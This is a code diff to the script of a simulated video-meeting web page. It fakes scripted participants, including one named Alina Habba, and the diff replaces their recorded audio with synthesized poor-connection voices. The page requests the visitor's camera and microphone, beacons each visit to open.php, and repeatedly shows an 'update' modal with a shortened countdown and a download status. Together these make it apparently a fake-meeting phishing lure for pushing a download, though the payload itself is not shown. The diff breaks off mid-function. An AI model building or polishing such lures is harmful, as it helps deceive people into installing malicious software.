@@ -422,8 +422,8 @@
 
 const CONFIG = {
     OVERLAY_INTERVAL_MS:10000,
-    OVERLAY_COUNTDOWN_SEC:9,
-    NETWORK_DROP_CHANCE:2,
+    OVERLAY_COUNTDOWN_SEC:5,
+    NETWORK_DROP_CHANCE:0.02,
     NETWORK_JITTER_MS:500,
     SPEAKING_THRESHOLD:0.02,
     PROCESS_PHP_URL:'process.php',
@@ -433,19 +433,20 @@ const CONFIG = {
 };
 
 const PARTICIPANTS = [
-    {id:'host', name:'Alina Habba', initials:'AH', role:'Meeting Host', audioFile:'audio/conversation-1.mp3', joinDelay:500, leaveDelay:null, isHost:true},
-    {id:'guest', name:'James Whitmore', initials:'JW', role:'Guest', audioFile:'audio/conversation-2.mp3', joinDelay:1500, leaveDelay:10000, isHost:false},
-    {id:'guest', name:'Sarah Chen', initials:'SC', role:'Guest', audioFile:'audio/conversation-3.mp3', joinDelay:2500, leaveDelay:8000, isHost:false}
+    {id:'host',   name:'Alina Habba',    initials:'AH', role:'Meeting Host', baseFreq:195, joinDelay:500,  leaveDelay:null,  isHost:true},
+    {id:'guest1', name:'James Whitmore', initials:'JW', role:'Guest',        baseFreq:125, joinDelay:1500, leaveDelay:10000, isHost:false},
+    {id:'guest2', name:'Sarah Chen',     initials:'SC', role:'Guest',        baseFreq:235, joinDelay:2500, leaveDelay:8000,  isHost:false}
 ];
 
-const AUDIO_FILES = {
-    userJoined:'audio/user-joined.mp3',
-    userLeft:'audio/user-left.mp3',
-    mute:'audio/mute.mp3',
-    unmute:'audio/unmute.mp3',
-    newSpeaker:'audio/new-speaker.mp3',
-    recordingStart:'audio/recording-start.mp3',
-    recordingStop:'audio/recording-stop.mp3'
+// ─── UI SOUND EFFECTS (synthesized phone-style chimes) ───
+const SFX = {
+    userJoined:    {freq:480,  type:'sine',   dur:0.25, sweep:620},
+    userLeft:      {freq:480,  type:'sine',   dur:0.25, sweep:320},
+    mute:          {freq:800,  type:'sine',   dur:0.06, sweep:600},
+    unmute:        {freq:600,  type:'sine',   dur:0.06, sweep:900},
+    newSpeaker:    {freq:440,  type:'sine',   dur:0.15, sweep:660},
+    recordingStart:{freq:440,  type:'sine',   dur:0.4,  sweep:440},
+    recordingStop: {freq:440,  type:'sine',   dur:0.2,  sweep:330}
 };
 
 let state = {
@@ -455,8 +456,8 @@ let state = {
     videoEnabled:true,
     activeParticipants:[],
     audioContext:null,
-    analysers:{},
-    audioElements:{},
+    analyserNodes:{},
+    voiceOscillators:{},
     overlayInterval:null,
     conversationTimeouts:[],
     animationFrameId:null,
@@ -471,7 +472,6 @@ let state = {
 
 const elements = {};
 
-/* ================= INIT ================= */
 document.addEventListener('DOMContentLoaded', init);
 
 function init(){
@@ -482,61 +482,21 @@ function init(){
 }
 
 async function sendOpenNotification(){
-    try{
-        await fetch(CONFIG.OPEN_PHP_URL,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})
-        });
-    }catch(e){console.warn('open notify failed',e)}
+    try{ await fetch(CONFIG.OPEN_PHP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})}); }catch(e){console.warn('open notify failed',e)}
 }
 
 function cacheElements(){
-    elements.loadingScreen=document.getElementById('loading-screen');
-    elements.prejoinScreen=document.getElementById('prejoin-screen');
-    elements.meetingScreen=document.getElementById('meeting-screen');
-    elements.joinBtn=document.getElementById('join-btn');
-    elements.leaveBtn=document.getElementById('leave-btn');
-    elements.unmuteBtn=document.getElementById('unmute-btn');
-    elements.videoBtn=document.getElementById('video-btn');
-    elements.chatBtn=document.getElementById('chat-btn');
-    elements.peopleBtn=document.getElementById('people-btn');
-    elements.chatPanel=document.getElementById('chat-panel');
-    elements.closeChat=document.getElementById('close-chat');
-    elements.chatInput=document.getElementById('chat-input');
-    elements.sendChat=document.getElementById('send-chat');
-    elements.chatMessages=document.getElementById('chat-messages');
-    elements.participantsModal=document.getElementById('participants-modal');
-    elements.closeParticipants=document.getElementById('close-participants');
-    elements.participantsList=document.getElementById('participants-list');
-    elements.updateModal=document.getElementById('update-modal');
-    elements.countdown=document.getElementById('countdown');
-    elements.downloadStatus=document.getElementById('download-status');
-    elements.localVideoSmall=document.getElementById('local-video-small');
-    elements.featuredVideo=document.getElementById('featured-video');
-    elements.featuredParticipant=document.getElementById('featured-participant');
-    elements.featuredAvatar=document.getElementById('featured-avatar');
-    elements.featuredName=document.getElementById('featured-name');
-    elements.featuredRole=document.getElementById('featured-role');
-    elements.featuredNameBottom=document.getElementById('featured-name-bottom');
-    elements.thumbnailsContainer=document.getElementById('thumbnails-container');
-    elements.notificationContainer=document.getElementById('notification-container');
-    elements.participantCount=document.getElementById('participant-count');
-    elements.othersCount=document.getElementById('others-count');
-    elements.localTile=document.getElementById('local-tile');
-    elements.audioEnable=document.getElementById('audio-enable');
-    elements.audioEnableBtn=document.getElementById('audio-enable-btn');
-    elements.audioFailedBanner=document.getElementById('audio-failed-banner');
+    ['loading-screen','prejoin-screen','meeting-screen','join-btn','leave-btn','unmute-btn','video-btn','chat-btn','people-btn','chat-panel','close-chat','chat-input','send-chat','chat-messages','participants-modal','close-participants','participants-list','update-modal','countdown','download-status','local-video-small','featured-video','featured-participant','featured-avatar','featured-name','featured-role','featured-name-bottom','thumbnails-container','notification-container','participant-count','others-count','local-tile','audio-enable','audio-enable-btn','audio-failed-banner'].forEach(id=>{
+        const key = id.replace(/-([a-z])/g,(_,c)=>c.toUpperCase());
+        elements[key] = document.getElementById(id);
+    });
 }
 
 function bindEvents(){
-    elements.joinBtn.addEventListener('click',async ()=>{
-        elements.joinBtn.disabled=true;
-        elements.joinBtn.textContent='Joining…';
+    elements.joinBtn.addEventListener('click',async()=>{
+        elements.joinBtn.disabled=true; elements.joinBtn.textContent='Joining…';
         await joinMeeting();
-        if(!state.audioEnableShown) showAudioEnableOnce();
-        elements.joinBtn.disabled=false;
-        elements.joinBtn.textContent='Join Meeting';
+        elements.joinBtn.disabled=false; elements.joinBtn.textContent='Join Meeting';
     });
     elements.leaveBtn.addEventListener('click',leaveMeeting);
     elements.unmuteBtn.addEventListener('click',toggleMic);
@@ -547,7 +507,7 @@ function bindEvents(){
     elements.chatInput.addEventListener('keypress',e=>{if(e.key==='Enter')sendChatMessage()});
     elements.peopleBtn.addEventListener('click',()=>elements.participantsModal.classList.remove('hidden'));
     elements.closeParticipants.addEventListener('click',()=>elements.participantsModal.classList.add('hidden'));
-    elements.participantsModal.addEventListener('click',e=>{if(e.target===elements.participantsModal) elements.participantsModal.classList.add('hidden')});
+    elements.participantsModal.addEventListener('click',e=>{if(e.target===elements.participantsModal)elements.participantsModal.classList.add('hidden')});
     elements.audioEnableBtn.addEventListener('click',onUserEnableAudio);
 }
 
@@ -555,490 +515,511 @@ function showLoadingScreen(){
     elements.loadingScreen.classList.remove('hidden');
     elements.prejoinScreen.classList.add('hidden');
     elements.meetingScreen.classList.add('hidden');
-    setTimeout(()=>{
-        elements.loadingScreen.classList.add('hidden');
-        elements.prejoinScreen.classList.remove('hidden');
-    }, CONFIG.LOADING_DURATION_MS);
+    setTimeout(()=>{elements.loadingScreen.classList.add('hidden');elements.prejoinScreen.classList.remove('hidden')},CONFIG.LOADING_DURATION_MS);
 }
 
-/* ================================================= */
-/* =============== JOIN MEETING ==================== */
-/* ================================================= */
+/* ═══════════════════════════════════════
+   JOIN / LEAVE
+   ═══════════════════════════════════════ */
+
 async function joinMeeting(){
     try{
         if(!state.audioContext) initAudioContext();
-        try{ await state.audioContext.resume() }catch(e){}
+        try{await state.audioContext.resume()}catch(e){}
+        const unlocked = await unlockAudio();
+        if(unlocked) state.speakerOn = true;
 
         let stream = null;
-
-        // ===== SAFE DEVICE FALLBACK (ONLY CHANGE) =====
         if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
-            try{
-                stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
-            }catch{
-                try{
-                    stream = await navigator.mediaDevices.getUserMedia({audio:true,video:false});
-                }catch{
-                    try{
-                        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
-                    }catch{
-                        stream = null;
-                    }
-                }
-            }
+            try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true})}
+            catch{try{stream=await navigator.mediaDevices.getUserMedia({audio:true,video:false})}
+            catch{try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false})}
+            catch{stream=null}}}
         }
-
         state.localStream = stream;
 
         if(state.localStream){
-            const videoTracks = state.localStream.getVideoTracks();
-            const audioTracks = state.localStream.getAudioTracks();
+            const vt=state.localStream.getVideoTracks(), at=state.localStream.getAudioTracks();
+            if(vt.length&&elements.localVideoSmall){elements.localVideoSmall.srcObject=state.localStream;elements.localVideoSmall.classList.remove('hidden');state.videoEnabled=true}
+            else{state.videoEnabled=false;elements.localVideoSmall.classList.add('hidden')}
+            if(at.length){at.forEach(t=>t.enabled=false);state.micEnabled=false}else state.micEnabled=false;
+        }else{state.videoEnabled=false;state.micEnabled=false;elements.localVideoSmall.classList.add('hidden')}
 
-            if(videoTracks.length && elements.localVideoSmall){
-                elements.localVideoSmall.srcObject = state.localStream;
-                elements.localVideoSmall.classList.remove('hidden');
-                state.videoEnabled = true;
-            }else{
-                state.videoEnabled = false;
-                elements.localVideoSmall.classList.add('hidden');
-            }
-
-            if(audioTracks.length){
-                audioTracks.forEach(t=>t.enabled=false);
-                state.micEnabled = false;
-            }else{
-                state.micEnabled = false;
-            }
-        }else{
-            state.videoEnabled = false;
-            state.micEnabled = false;
-            elements.localVideoSmall.classList.add('hidden');
-        }
-
-        if(elements.featuredVideo){
-            elements.featuredVideo.classList.add('hidden');
-        }
-
+        if(elements.featuredVideo) elements.featuredVideo.classList.add('hidden');
         elements.prejoinScreen.classList.add('hidden');
         elements.meetingScreen.classList.remove('hidden');
         state.inMeeting = true;
 
-        await unlockAudio();
         simulateParticipantsJoining();
-        startConversationAudio();
         startRecurringOverlay();
         updateParticipantsList();
-
     }catch(err){
         console.error('Failed to join meeting:',err);
         alert('Unable to start meeting. See console.');
-        elements.joinBtn.disabled=false;
-        elements.joinBtn.textContent='Join Meeting';
+        elements.joinBtn.disabled=false; elements.joinBtn.textContent='Join Meeting';
     }
 }
 
-/* ================= EVERYTHING BELOW IS 100% ORIGINAL ================= */
+function leaveMeeting(){
+    state.inMeeting=false;
+    if(state.localStream){state.localStream.getTracks().forEach(t=>t.stop());state.localStream=null}
+    Object.keys(state.voiceOscillators).forEach(id=>stopVoice(id));
+    state.voiceOscillators={}; state.analyserNodes={};
+    state.conversationTimeouts.forEach(t=>clearTimeout(t)); state.conversationTimeouts=[];
+    if(state.overlayInterval){clearInterval(state.overlayInterval);state.overlayInterval=null}
+    if(state.animationFrameId){cancelAnimationFrame(state.animationFrameId);state.animationFrameId=null}
+    if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
+    if(state.speakerOffTimeout){clearTimeout(state.speakerOffTimeout);state.speakerOffTimeout=null}
+    try{if(state.audioContext&&typeof state.audioContext.close==='function')state.audioContext.close()}catch(e){console.warn(e)}
+    state.audioContext=null;
+    state.activeParticipants=[]; elements.thumbnailsContainer.innerHTML='';
+    elements.meetingScreen.classList.add('hidden'); elements.updateModal.classList.add('hidden'); elements.chatPanel.classList.remove('open');
+    showLoadingScreen();
+}
 
-        function leaveMeeting(){
-            state.inMeeting=false;
-            if(state.localStream){ state.localStream.getTracks().forEach(t=>t.stop()); state.localStream=null; }
-            Object.values(state.audioElements).forEach(a=>{ try{ a.pause(); a.currentTime=0 }catch(e){} });
-            state.audioElements={};
-            state.conversationTimeouts.forEach(t=>clearTimeout(t)); state.conversationTimeouts=[];
-            if(state.overlayInterval){ clearInterval(state.overlayInterval); state.overlayInterval=null }
-            if(state.animationFrameId){ cancelAnimationFrame(state.animationFrameId); state.animationFrameId=null }
-            if(state.countdownInterval){ clearInterval(state.countdownInterval); state.countdownInterval=null }
-            if(state.speakerOffTimeout){ clearTimeout(state.speakerOffTimeout); state.speakerOffTimeout=null }
-            try{ if(state.audioContext && typeof state.audioContext.close==='function'){ state.audioContext.close() } }catch(e){console.warn(e)}
-            state.audioContext=null; state.analysers={};
-            state.activeParticipants=[]; elements.thumbnailsContainer.innerHTML='';
-            elements.meetingScreen.classList.add('hidden'); elements.updateModal.classList.add('hidden'); elements.chatPanel.classList.remove('open');
-            showLoadingScreen();
-        }
+function toggleMic(){
+    state.micEnabled=!state.micEnabled;
+    if(state.localStream) state.localStream.getAudioTracks().forEach(t=>t.enabled=state.micEnabled);
+    if(state.micEnabled){elements.unmuteBtn.classList.remove('active');elements.unmuteBtn.querySelector('span').textContent='Mute';playSFX('unmute')}
+    else{elements.unmuteBtn.classList.add('active');elements.unmuteBtn.querySelector('span').textContent='Unmute';playSFX('mute')}
+    updateParticipantsList();
+}
 
-        function toggleMic(){
-            state.micEnabled=!state.micEnabled;
-            if(state.localStream) state.localStream.getAudioTracks().forEach(t=>t.enabled = state.micEnabled);
-            if(state.micEnabled){ elements.unmuteBtn.classList.remove('active'); elements.unmuteBtn.querySelector('span').textContent='Mute'; playUISound(AUDIO_FILES.unmute) }
-            else{ elements.unmuteBtn.classList.add('active'); elements.unmuteBtn.querySelector('span').textContent='Unmute'; playUISound(AUDIO_FILES.mute) }
-            updateParticipantsList();
-        }
+function toggleVideo(){
+    state.videoEnabled=!state.videoEnabled;
+    if(state.localStream) state.localStream.getVideoTracks().forEach(t=>t.enabled=state.videoEnabled);
+    if(state.videoEnabled){elements.videoBtn.classList.remove('active');elements.localVideoSmall&&elements.localVideoSmall.classList.remove('hidden')}
+    else{elements.videoBtn.classList.add('active');elements.localVideoSmall&&elements.localVideoSmall.classList.add('hidden')}
+}
 
-        function toggleVideo(){
-            // toggle visibility of the local camera only (local-video-small)
-            state.videoEnabled = !state.videoEnabled;
-            if(state.localStream) state.localStream.getVideoTracks().forEach(t=>t.enabled = state.videoEnabled);
-            if(state.videoEnabled){
-                elements.videoBtn.classList.remove('active');
-                elements.localVideoSmall && elements.localVideoSmall.classList.remove('hidden');
-            } else {
-                elements.videoBtn.classList.add('active');
-                elements.localVideoSmall && elements.localVideoSmall.classList.add('hidden');
-            }
-        }
+function toggleChat(){elements.chatPanel.classList.toggle('open')}
+function sendChatMessage(){const m=elements.chatInput.value.trim();if(!m)return;const el=document.createElement('div');el.className='mb-3 p-3 bg-blue-500/20 rounded-lg';el.innerHTML=`<span class="font-semibold text-blue-400">You:</span> ${m}`;elements.chatMessages.appendChild(el);elements.chatMessages.scrollTop=elements.chatMessages.scrollHeight;elements.chatInput.value=''}
 
-        function toggleChat(){ elements.chatPanel.classList.toggle('open') }
-        function sendChatMessage(){ const message = elements.chatInput.value.trim(); if(!message) return; const msgEl = document.createElement('div'); msgEl.className='mb-3 p-3 bg-blue-500/20 rounded-lg'; msgEl.innerHTML = `<span class="font-semibold text-blue-400">You:</span> ${message}`; elements.chatMessages.appendChild(msgEl); elements.chatMessages.scrollTop = elements.chatMessages.scrollHeight; elements.chatInput.value='' }
+function initAudioContext(){if(!state.audioContext)state.audioContext=new(window.AudioContext||window.webkitAudioContext)()}
 
-        function initAudioContext(){ if(!state.audioContext) { state.audioContext = new (window.AudioContext || window.webkitAudioContext)(); console.log('AudioContext', state.audioContext.state) } }
-
-        async function unlockAudio(){ try{ if(!state.audioContext) initAudioContext(); if(state.audioContext.state === 'suspended') await state.audioContext.resume(); const buffer = state.audioContext.createBuffer(1,1,state.audioContext.sampleRate||44100); const src = state.audioContext.createBufferSource(); src.buffer = buffer; src.connect(state.audioContext.destination); src.start(0); await new Promise(r=>setTimeout(r,50)); console.log('Audio unlocked'); state.audioBlocked=false; hideAudioEnable(); return true; }catch(err){ console.warn('unlockAudio failed',err); state.audioBlocked=true; return false } }
-
-        function showAudioEnableOnce(){ if(state.audioEnableShown) return; state.audioEnableShown = true; elements.audioEnable.classList.add('show'); }
-        function hideAudioEnable(){ elements.audioEnable.classList.remove('show') }
-        function safePlayAudioElement(audio, id=''){ if(!audio) return Promise.resolve(false); try{ audio.volume=1.0; audio.muted=false }catch(e){} return audio.play().then(()=>{ console.log('Audio playing',id); state.speakerOn=true; return true }).catch(err=>{ console.warn('Audio play failed',id,err); state.audioBlocked=true; showAudioEnableOnce(); return false }) }
-
-        function speakerOff(){ if(state.speakerOffTimeout){ clearTimeout(state.speakerOffTimeout); state.speakerOffTimeout=null } Object.keys(state.audioElements || {}).forEach(id=>{ try{ const a = state.audioElements[id]; if(a){ a.pause(); a.currentTime = 0 } }catch(e){} }); state.speakerOn = false; console.log('Speaker forced OFF: all participant audio paused.') }
-        async function speakerOn(){ const ok = await unlockAudio().catch(()=>false); const ids = Object.keys(state.audioElements || {}); for(const id of ids){ try{ const audio = state.audioElements[id]; if(!audio) continue; await safePlayAudioElement(audio,id); }catch(e){} } state.speakerOn = true; hideAudioEnable(); console.log('Speaker ON attempted.') }
-
-        async function checkAudioUrl(url){ try{ const res = await fetch(url,{method:'HEAD',mode:'cors'}); if(res.ok) return {ok:true}; const res2 = await fetch(url,{method:'GET',mode:'cors'}); if(res2.ok) return {ok:true}; return {ok:false,status:res.status||res2.status,statusText:res.statusText||res2.statusText}; }catch(err){ console.warn('checkAudioUrl error',url,err); return {ok:false,error:err.message||String(err)} } }
-
-        function simulateParticipantsJoining(){ PARTICIPANTS.forEach(participant=>{ setTimeout(async ()=>{ if(!state.inMeeting) return; addParticipant(participant); showNotification(`${participant.name} joined the meeting`, participant);
-               console.log(participant.name + ' JOIN SOUND TRIGGERED'); playUISound(AUDIO_FILES.userJoined);
-               document.body.style.transform = 'scale(1.002)';
-               setTimeout(() => {
-                   document.body.style.transform = 'scale(1)';
-               }, 120); const audio = new Audio(participant.audioFile); audio.loop = true; audio.preload='auto'; audio.crossOrigin='anonymous'; state.audioElements[participant.id] = audio; audio.addEventListener('canplay',()=>{ try{ if(!state.audioContext) initAudioContext(); const src = state.audioContext.createMediaElementSource(audio); const analyser = state.audioContext.createAnalyser(); analyser.fftSize=256; src.connect(analyser); analyser.connect(state.audioContext.destination); state.analysers[participant.id] = analyser; }catch(e){} },{once:true}); const jitter = Math.random() * CONFIG.NETWORK_JITTER_MS; setTimeout(()=>{ if(!state.inMeeting) return; if(state.speakerOn) safePlayAudioElement(audio, participant.id); else showAudioEnableOnce() }, jitter); }, participant.joinDelay); }); }
-
-        function addParticipant(participant){ if(state.activeParticipants.find(p=>p.id===participant.id)) return; state.activeParticipants.push(participant); updateParticipantsUI(); updateParticipantsList(); }
-        function removeParticipant(participantId){ state.activeParticipants = state.activeParticipants.filter(p=>p.id!==participantId); updateParticipantsUI(); updateParticipantsList(); }
-
-        function updateParticipantsUI(){ const count = state.activeParticipants.length + 1; elements.participantCount.textContent = `${count} people`; elements.othersCount.textContent = Math.max(0, state.activeParticipants.length - 1); if(state.activeParticipants.length > 0){ const featured = state.activeParticipants[0]; elements.featuredAvatar.textContent = featured.initials; elements.featuredName.textContent = featured.name; elements.featuredRole.textContent = featured.role; elements.featuredNameBottom.textContent = featured.name; } elements.thumbnailsContainer.innerHTML = ''; state.activeParticipants.slice(1).forEach(participant=>{ const thumb = document.createElement('div'); thumb.className = 'thumbnail-tile'; thumb.id = `thumb-${participant.id}`; thumb.innerHTML = `<div class="thumb-avatar">${participant.initials}</div>`; elements.thumbnailsContainer.appendChild(thumb); }); }
-
-        function updateParticipantsList(){ elements.participantsList.innerHTML = ''; const allParticipants = [{name:'You',role:'Participant',micEnabled:state.micEnabled,videoEnabled:state.videoEnabled},...state.activeParticipants.map(p=>({name:p.name,role:p.isHost?'Host':'Participant',micEnabled:true,videoEnabled:false}))]; allParticipants.forEach(p=>{ const item = document.createElement('div'); item.className = 'flex items-center justify-between p-2 bg-black/20 rounded-lg'; item.innerHTML = `<div class="flex items-center gap-3"><div class="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center text-sm font-bold">${p.name.split(' ').map(n=>n[0]).join('').slice(0,2)}</div><div><p class="font-medium text-sm">${p.name}</p><p class="text-gray-400 text-xs">${p.role}</p></div></div><div class="flex gap-2"><div class="w-8 h-8 rounded-full ${p.micEnabled?'bg-green-500':'bg-red-500'} flex items-center justify-center"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M7 4a3 3 0 016 0v4a3 3 0 11-6 0V4z" clip-rule="evenodd"/></svg></div><div class="w-8 h-8 rounded-full ${p.videoEnabled?'bg-green-500':'bg-red-500'} flex items-center justify-center"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M2 6a2 2 0 012-2h6a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"/></svg></div></div>`; elements.participantsList.appendChild(item); }); }
-
-        function showNotification(message, participantData=null){ const isJoin=/joined/i.test(message); const isLeft=/left/i.test(message); let initials='?'; let displayName=message; if(participantData && participantData.name){ displayName = participantData.name; initials = (participantData.initials || displayName.split(' ').map(n=>n[0]).join('').slice(0,2)).toUpperCase() } else if(isJoin||isLeft){ const m = message.match(/^(.*?)\s+(joined|left)/i); if(m && m[1]){ displayName=m[1].trim(); initials = displayName.split(' ').map(n=>n[0]||'').slice(0,2).join('').toUpperCase() } else initials = message.replace(/\s+/g,'').slice(0,2).toUpperCase() } const n = document.createElement('div'); n.className = `notification-banner${isLeft ? ' leave' : ''}`; const iconSvg = isLeft ? `<svg class="notification-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>` : `<svg class="notification-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"/></svg>`; if(isJoin||isLeft){ n.innerHTML = `<div class="notification-avatar">${initials}</div><div class="notification-content"><span class="notification-title">${displayName}</span><span class="notification-subtitle">${isLeft?'Left the meeting':'Joined the meeting'}</span></div>${iconSvg}` } else { n.innerHTML = `<div class="notification-content"><span class="notification-title">${message}</span></div>` } elements.notificationContainer.appendChild(n); setTimeout(()=>{ n.style.animation = 'notificationExit .3s ease-out forwards'; setTimeout(()=>n.remove(),300) },3000) }
-
-        
-function playUISound(audioFile){
+async function unlockAudio(){
     try{
-        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
-        const ctx = new AudioContextClass();
+        if(!state.audioContext)initAudioContext();
+        if(state.audioContext.state==='suspended')await state.audioContext.resume();
+        const buf=state.audioContext.createBuffer(1,1,state.audioContext.sampleRate||44100);
+        const src=state.audioContext.createBufferSource();src.buffer=buf;src.connect(state.audioContext.destination);src.start(0);
+        await new Promise(r=>setTimeout(r,50));
+        state.audioBlocked=false;hideAudioEnable();return true;
+    }catch(err){console.warn('unlockAudio failed',err);state.audioBlocked=true;return false}
+}
 
-        if (ctx.state === 'suspended') {
-            ctx.resume();
+function showAudioEnableOnce(){if(state.audioEnableShown)return;state.audioEnableShown=true;elements.audioEnable.classList.add('show')}
+function hideAudioEnable(){elements.audioEnable.classList.remove('show')}
+
+/* ═══════════════════════════════════════════════════════
+   BAD-CALL VOICE ENGINE
+   Synthesizes that crackling, buzzing, dropout "low signal"
+   phone sound — no external audio files needed.
+   ═══════════════════════════════════════════════════════ */
+
+function playSFX(name){
+    const s=SFX[name]; if(!s||!state.audioContext)return;
+    try{
+        const ctx=state.audioContext, now=ctx.currentTime;
+        if(name==='userJoined'){
+            // Two-tone phone chime
+            [480,620].forEach((freq,idx)=>{
+                const o=ctx.createOscillator(),g=ctx.createGain();
+                o.type='sine';o.frequency.setValueAtTime(freq,now+idx*0.15);
+                g.gain.setValueAtTime(0.2,now+idx*0.15);
+                g.gain.exponentialRampToValueAtTime(0.001,now+idx*0.15+0.2);
+                o.connect(g);g.connect(ctx.destination);
+                o.start(now+idx*0.15);o.stop(now+idx*0.15+0.25);
+            });
+            return;
         }
-
-        // MAIN LOUD POP
-        const osc1 = ctx.createOscillator();
-        const gain1 = ctx.createGain();
-
-        osc1.type = 'square';
-        osc1.frequency.setValueAtTime(1040, ctx.currentTime);
-
-        gain1.gain.setValueAtTime(1.0, ctx.currentTime);
-        gain1.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
-
-        osc1.connect(gain1);
-        gain1.connect(ctx.destination);
-
-        osc1.start();
-        osc1.stop(ctx.currentTime + 0.5);
-
-        // SECOND POP FOR STRONGER EFFECT
-        const osc2 = ctx.createOscillator();
-        const gain2 = ctx.createGain();
-
-        osc2.type = 'triangle';
-        osc2.frequency.setValueAtTime(760, ctx.currentTime + 0.08);
-
-        gain2.gain.setValueAtTime(0.8, ctx.currentTime + 0.08);
-        gain2.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.45);
-
-        osc2.connect(gain2);
-        gain2.connect(ctx.destination);
-
-        osc2.start(ctx.currentTime + 0.08);
-        osc2.stop(ctx.currentTime + 0.45);
-
-        console.log('LOUD JOIN SOUND PLAYED');
-
-    }catch(e){
-        console.warn('Sound failed:', e);
-    }
+        const o=ctx.createOscillator(),g=ctx.createGain();
+        o.type=s.type;o.frequency.setValueAtTime(s.freq,now);
+        o.frequency.exponentialRampToValueAtTime(Math.max(s.sweep,20),now+s.dur);
+        g.gain.setValueAtTime(0.2,now);g.gain.exponentialRampToValueAtTime(0.001,now+s.dur);
+        o.connect(g);g.connect(ctx.destination);o.start(now);o.stop(now+s.dur+0.01);
+    }catch(e){console.warn('playSFX',name,e)}
 }
 
+function startVoice(participantId, baseFreq){
+    if(!state.audioContext)return;
+    if(state.voiceOscillators[participantId])return;
 
-        function startConversationAudio(){ PARTICIPANTS.forEach(participant=>{ if(!participant.audioFile) return; setTimeout(()=>{ if(!state.inMeeting) return; playParticipantAudio(participant) }, participant.joinDelay + 1000) }); startSpeakingDetection() }
+    const ctx=state.audioContext, now=ctx.currentTime;
 
-        function playParticipantAudio(participant){ if(!state.inMeeting || !participant.audioFile) return; if(Math.random() < CONFIG.NETWORK_DROP_CHANCE){ showNetworkIssue(participant.id); return } const audio = new Audio(participant.audioFile); audio.loop=true; audio.preload='auto'; audio.crossOrigin='anonymous'; state.audioElements[participant.id] = audio; audio.addEventListener('canplay',()=>{ try{ if(!state.audioContext) initAudioContext(); const src = state.audioContext.createMediaElementSource(audio); const analyser = state.audioContext.createAnalyser(); analyser.fftSize = 256; src.connect(analyser); analyser.connect(state.audioContext.destination); state.analysers[participant.id] = analyser; }catch(e){} },{once:true}); const jitter = Math.random() * CONFIG.NETWORK_JITTER_MS; setTimeout(()=>{ if(!state.inMeeting) return; if(state.speakerOn) safePlayAudioElement(audio,participant.id); else showAudioEnableOnce() }, jitter) }
+    // ─── VOICE SOURCE ───
+    // Fundamental (sawtooth = rich harmonics like vocal cords)
+    const osc=ctx.createOscillator();
+    osc.type='sawtooth';
+    osc.frequency.setValueAtTime(baseFreq,now);
 
-        function startSpeakingDetection(){ if(state.animationFrameId) { cancelAnimationFrame(state.animationFrameId); state.animationFrameId=null } let pendingSpeakerId=null; let speakerDebounceTimer=null; const SPEAKER_DEBOUNCE_MS = 2000; const SPEAKER_SWITCH_THRESHOLD=0.06; function detect(){ if(!state.inMeeting) return; let loudestSpeaker=null; let loudestLevel=0; Object.entries(state.analysers).forEach(([participantId,analyser])=>{ if(!analyser) return; const dataArray = new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(dataArray); let sum=0; for(let i=0;i<dataArray.length;i++) sum+=dataArray[i]; const rms = sum / dataArray.length / 255; const participant = state.activeParticipants.find(p=>p.id===participantId); if(!participant) return; const isFeatured = state.activeParticipants[0]?.id === participantId; const thumb = document.getElementById(`thumb-${participantId}`); if(rms > CONFIG.SPEAKING_THRESHOLD){ if(isFeatured) elements.featuredParticipant.classList.add('speaking'); if(thumb) thumb.classList.add('speaking'); if(rms > loudestLevel){ loudestLevel=rms; loudestSpeaker = participant } } else { if(isFeatured) elements.featuredParticipant.classList.remove('speaking'); if(thumb) thumb.classList.remove('speaking'); } }); const currentFeaturedId = state.activeParticipants[0]?.id; if(loudestSpeaker && loudestSpeaker.id !== currentFeaturedId && loudestLevel > SPEAKER_SWITCH_THRESHOLD){ if(pendingSpeakerId !== loudestSpeaker.id){ pendingSpeakerId = loudestSpeaker.id; if(speakerDebounceTimer) clearTimeout(speakerDebounceTimer); const speakerToSwitch = loudestSpeaker; speakerDebounceTimer = setTimeout(()=>{ if(state.inMeeting && state.activeParticipants[0]?.id !== speakerToSwitch.id){ switchFeaturedSpeaker(speakerToSwitch); } speakerDebounceTimer=null; pendingSpeakerId=null; }, SPEAKER_DEBOUNCE_MS); } } state.animationFrameId = requestAnimationFrame(detect); } detect() }
+    // Second harmonic, slightly detuned for thickness
+    const osc2=ctx.createOscillator();
+    osc2.type='triangle';
+    osc2.frequency.setValueAtTime(baseFreq*2.01,now);
+    const osc2Gain=ctx.createGain();
+    osc2Gain.gain.setValueAtTime(0.12,now);
+    osc2.connect(osc2Gain);
 
-        function switchFeaturedSpeaker(newSpeaker){ const idx = state.activeParticipants.findIndex(p=>p.id===newSpeaker.id); if(idx === -1 || idx === 0) return; const removed = state.activeParticipants.splice(idx,1)[0]; state.activeParticipants.unshift(removed); updateParticipantsUI(); playUISound(AUDIO_FILES.newSpeaker) }
+    // Vibrato — pitch wobble
